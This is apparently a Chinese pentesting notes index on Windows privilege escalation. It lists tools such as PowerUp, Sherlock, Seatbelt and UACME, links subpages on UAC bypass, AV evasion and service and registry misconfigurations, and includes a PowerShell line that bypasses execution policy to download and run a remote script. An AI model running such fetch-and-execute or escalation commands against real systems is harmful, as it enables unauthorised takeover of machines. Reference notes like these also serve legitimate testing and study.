# windows提权

## **msf的利用 :**

**post/multi/recon/local\_exploit\_suggester**

## **利用工具：**

https://github.com/carlospolop/PEASS-ng

**PowerUp 使用**

```bash
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http:///PowerUp.ps1'); Invoke-AllChecks
```

https://github.com/rasta-mouse/Sherlock 可**以快速通过系统补丁的存在来进行提权，下列为使用方法：**

```bash
powershell powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
```

- [windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems](https://github.com/pentestmonkey/windows-privesc-check)
- https://github.com/pentestmonkey/windows-privesc-check **通过发现错误配置来进行提权**
- https://github.com/GhostPack/Seatbelt **多重对提权项进行枚举扫描，下列为利用方式：**

```bash
powershell Seatbelt.exe -group=all -full Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt" Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```

https://github.com/hfiref0x/UACME **UAC利用，针对Windows 7/8/8.1/10** 

## 提权枚举

[提权枚举-主要针对系统信息](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%8F%90%E6%9D%83%E6%9E%9A%E4%B8%BE-%E4%B8%BB%E8%A6%81%E9%92%88%E5%AF%B9%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%20053742f86169427b9de8f752a26355ee.md)

[UAC bypass](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/UAC%20bypass%205307d952fb654cccb92781a5e3e961e0.md)

[AV躲避](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/AV%E8%BA%B2%E9%81%BF%20be618bf1cd524aaa917bad49e8bb12a1.md)

[什么用户在**运行何种服务/进程**](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E4%BB%80%E4%B9%88%E7%94%A8%E6%88%B7%E5%9C%A8%E8%BF%90%E8%A1%8C%E4%BD%95%E7%A7%8D%E6%9C%8D%E5%8A%A1%20%E8%BF%9B%E7%A8%8B%20061ef34adc1544698cecd083b9692345.md)

## **提权针对性的利用**

[错误的服务权限属性](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%94%99%E8%AF%AF%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7%20d547a1c5562f4ee89e824a664e1ba215.md)

[错误的服务权限属性-win10中****UsoSvc错误服务权限（CVE-2019-1322）****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%94%99%E8%AF%AF%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7-win10%E4%B8%ADUsoSvc%E9%94%99%E8%AF%AF%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%EF%BC%88CVE-2019-1322%EF%BC%89%2097842b9fcfdd4892a3c1868f86b9b9ea.md)

[错误的服务权限属性-****Windows XP SP1的upnphost  错误服务权限****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%94%99%E8%AF%AF%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7-Windows%20XP%20SP1%E7%9A%84upnphost%20%E9%94%99%E8%AF%AF%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%20699e0a0c95344ef6916766c48cc852e3.md)

[错误的服务权限属性-**daclsvc错误服务权限**](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%94%99%E8%AF%AF%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E5%B1%9E%E6%80%A7-daclsvc%E9%94%99%E8%AF%AF%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%20459c83c8e3e0472bb1e89113d5850369.md)

[未引用的服务路径](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%9C%AA%E5%BC%95%E7%94%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%209cb063c6b9ac4d6586bb324d560c2493.md)

[注册表配置错误-****AlwaysInstallElevated****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-AlwaysInstallElevated%204ca8c9ec1dda4114923204961b00c26e.md)

[注册表配置错误-弱注册表权限](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-%E5%BC%B1%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%9D%83%E9%99%90%203cc30625999f4bc38c8e9f718771013b.md)

[注册表配置错误-储存在注册表中的密码](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-%E5%82%A8%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%207a5cb68c525e43acb1feca00aaa00eb9.md)

[注册表配置错误-自动运行](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-%E8%87%AA%E5%8A%A8%E8%BF%90%E8%A1%8C%201061852055564e4e91a9d97604c95c17.md)

[利用****Impersonation 权限提权****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%88%A9%E7%94%A8Impersonation%20%E6%9D%83%E9%99%90%E6%8F%90%E6%9D%83%20ec1a8b0450e2454299151d4377c87709.md)

[计划任务提权](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83%20ca71d16a36bc4c44a8603a3fecf41dbc.md)

[利用本地的文件/脚本进行提权](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84%E6%96%87%E4%BB%B6%20%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83%20c5c9e47c33004c198d7cc5a3065fd135.md)

[开机启动的应用程序利用](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8%20634453a47bae448bba86742f9806c0cd.md)

[利用****Runas 程序****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%88%A9%E7%94%A8Runas%20%E7%A8%8B%E5%BA%8F%20564297da632d475cba399b3126666a34.md)

[针对密码-从文件中发现密码](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%92%88%E5%AF%B9%E5%AF%86%E7%A0%81-%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%2047c2d8b209c044e9b735a1f70ebd70e9.md)

[不安全的服务中的可执行文件](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E4%B8%AD%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%20c2c20f34f3324b8582ed097326dc7a94.md)

[打印机漏洞](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E6%89%93%E5%8D%B0%E6%9C%BA%E6%BC%8F%E6%B4%9E%209f843b16fa254b1f841b7bedef4cd2d7.md)

[利用卷影复制-需具有本地管理员权限](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%88%A9%E7%94%A8%E5%8D%B7%E5%BD%B1%E5%A4%8D%E5%88%B6-%E9%9C%80%E5%85%B7%E6%9C%89%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%20d1a38580589f4d539c8f09433d4372aa.md)

[通过不安全的GUI进行利用](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%80%9A%E8%BF%87%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84GUI%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8%2073843c0988964624888123c60eb10316.md)

[**可写的高权限文件**](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%8F%AF%E5%86%99%E7%9A%84%E9%AB%98%E6%9D%83%E9%99%90%E6%96%87%E4%BB%B6%20a75266328b4e4c0489118b8134c3dbdc.md)

[从本地管理员到本地SYSTEM权限-使用`PsExec`-不太确定](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E5%88%B0%E6%9C%AC%E5%9C%B0SYSTEM%E6%9D%83%E9%99%90-%E4%BD%BF%E7%94%A8PsExec-%E4%B8%8D%E5%A4%AA%E7%A1%AE%E5%AE%9A%205c451f81c32d459eb608c9decb6b3d79.md)

[利用不安全的****驱动程序****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20695a487baaf54a00a5d5efdf552155a2.md)

[****$PATH 拦截****](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/$PATH%20%E6%8B%A6%E6%88%AA%2062db344a5f9648cab07ce8c9f3f5f2b3.md)

[windows 的 linux 子系统的利用](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/windows%20%E7%9A%84%20linux%20%E5%AD%90%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%88%A9%E7%94%A8%20f5212ae784b04b1d9cc6abb769e370e7.md)

[针对性的内核利用](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%92%88%E5%AF%B9%E6%80%A7%E7%9A%84%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8%20f6203a86b4ed46e083566be18ff1c23e.md)

[重大提权漏洞](windows%E6%8F%90%E6%9D%83%20c91ad032362f41a6b9e333fcf852b54d/%E9%87%8D%E5%A4%A7%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%20829d0abc4a4a458589f409f31ce25c2c.md)

[****KrbRelayUp工具****](可用于域环境下的本地用户提权)

## 相关文章：

https://github.com/frizb/Windows-Privilege-Escalation

[http://www.hackdig.com/10/hack-178563.htm](http://www.hackdig.com/10/hack-178563.htm)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)